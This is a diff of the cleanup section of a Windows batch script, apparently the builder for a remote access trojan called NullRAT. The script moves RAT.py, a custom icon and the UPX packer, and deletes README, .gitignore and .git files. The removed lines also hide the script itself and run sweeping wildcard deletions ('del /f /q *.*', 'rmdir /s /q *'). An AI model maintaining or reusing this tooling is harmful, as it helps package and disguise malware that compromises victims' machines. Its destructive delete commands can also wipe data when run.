@@ -124,22 +124,21 @@ if %errorlevel%==1 (
 pause
 
 :cleanup
-attrib +h "%~nx0"
-cd "%~dp0\NullRAT"
-move RAT.py "%~dp0\" 
-move custom_icon.ico "%~dp0\"
-move upx\upx.exe "%~dp0\"
-cd "%~dp0\" & rmdir /s /q "%~dp0\NullRAT\"
-mkdir "%~dp0\NullRAT\" & move RAT.py "%~dp0\NullRAT\"
-move custom_icon.ico "%~dp0\NullRAT\" & mkdir "%~dp0\NullRAT\upx\"
-move upx.exe "%~dp0\NullRAT\upx\" 
-if exist README.md (del README.md)
-if exist "Getting Variables".md (del README.md)
-if exist .git\ (rmdir /s /q .git\)
-move "%~nx0" "%~dp0\temp"
-del /f /q *.* 
-rmdir /s /q * & rmdir /s /q build\
-cd "%~dp0\temp"
-move * "%~dp0\" & cd "%~dp0\"
-rmdir /s /q "%~dp0\temp"
-attrib -h "%~nx0"
+cd "%~dp0"
+attrib -h ".git"
+del README.md
+del "Getting Variables".md
+del .gitignore
+rmdir /s /q ".git"
+cd "%~dp0NullRAT"
+move upx\ "%~dp0"
+move custom_icon.ico "%~dp0"
+move RAT.py "%~dp0"
+cd "%~dp0"
+rmdir /s /q NullRAT
+mkdir NullRAT
+move RAT.py NullRAT\
+move custom_icon.ico NullRAT\
+move upx\ NullRAT
+
+goto main
